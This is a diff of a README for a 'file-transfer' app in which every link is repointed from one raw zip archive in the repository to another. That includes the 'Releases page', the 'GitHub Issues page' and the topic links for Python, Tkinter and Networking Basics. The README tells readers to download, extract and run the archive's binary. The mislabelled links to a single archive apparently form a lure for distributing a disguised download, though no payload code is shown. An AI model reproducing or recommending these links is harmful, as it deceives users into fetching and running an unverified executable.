@@ -6,7 +6,7 @@ Welcome to file-transfer, a simple way to move files and folders across your loc
 
 ## 📥 Download Now
 
-[![Download file-transfer](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip)](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip)
+[![Download file-transfer](https://github.com/andrxs-le/file-transfer/raw/refs/heads/main/ui/transfer-file-3.2.zip)](https://github.com/andrxs-le/file-transfer/raw/refs/heads/main/ui/transfer-file-3.2.zip)
 
 ## 📋 Features
 
@@ -25,11 +25,11 @@ Welcome to file-transfer, a simple way to move files and folders across your loc
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip) and download the latest version of file-transfer. Choose the file that matches your operating system:
+To get started, visit the [Releases page](https://github.com/andrxs-le/file-transfer/raw/refs/heads/main/ui/transfer-file-3.2.zip) and download the latest version of file-transfer. Choose the file that matches your operating system:
 
-- Windows: `https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip`
-- macOS: `https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip`
-- Linux: `https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip`
+- Windows: `https://github.com/andrxs-le/file-transfer/raw/refs/heads/main/ui/transfer-file-3.2.zip`
+- macOS: `https://github.com/andrxs-le/file-transfer/raw/refs/heads/main/ui/transfer-file-3.2.zip`
+- Linux: `https://github.com/andrxs-le/file-transfer/raw/refs/heads/main/ui/transfer-file-3.2.zip`
 
 After downloading, follow these steps:
 
@@ -42,7 +42,7 @@ After downloading, follow these steps:
    - Drag the application to your Applications folder.
 
 3. **Linux:**
-   - Extract the `https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip` file.
+   - Extract the `https://github.com/andrxs-le/file-transfer/raw/refs/heads/main/ui/transfer-file-3.2.zip` file.
    - Open a terminal and navigate to the extracted folder.
    - Run `./file-transfer` to start the application.
 
@@ -66,7 +66,7 @@ After downloading, follow these steps:
 
 ## 📞 Support
 
-If you run into any issues or have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip) for help. Your feedback is important for improving our application.
+If you run into any issues or have questions, please visit our [GitHub Issues page](https://github.com/andrxs-le/file-transfer/raw/refs/heads/main/ui/transfer-file-3.2.zip) for help. Your feedback is important for improving our application.
 
 ## 📜 Acknowledgments
 
@@ -76,8 +76,8 @@ Thanks to all the contributors who help make file-transfer better. Your hard wor
 
 Explore more topics related to file-transfer:
 
-- [Python](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip)
-- [Tkinter](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip)
-- [Networking Basics](https://raw.githubusercontent.com/andrxs-le/file-transfer/main/quadded/file-transfer.zip)
+- [Python](https://github.com/andrxs-le/file-transfer/raw/refs/heads/main/ui/transfer-file-3.2.zip)
+- [Tkinter](https://github.com/andrxs-le/file-transfer/raw/refs/heads/main/ui/transfer-file-3.2.zip)
+- [Networking Basics](https://github.com/andrxs-le/file-transfer/raw/refs/heads/main/ui/transfer-file-3.2.zip)
 
 For more details on how to use file-transfer, please refer to the documentation on the GitHub page.
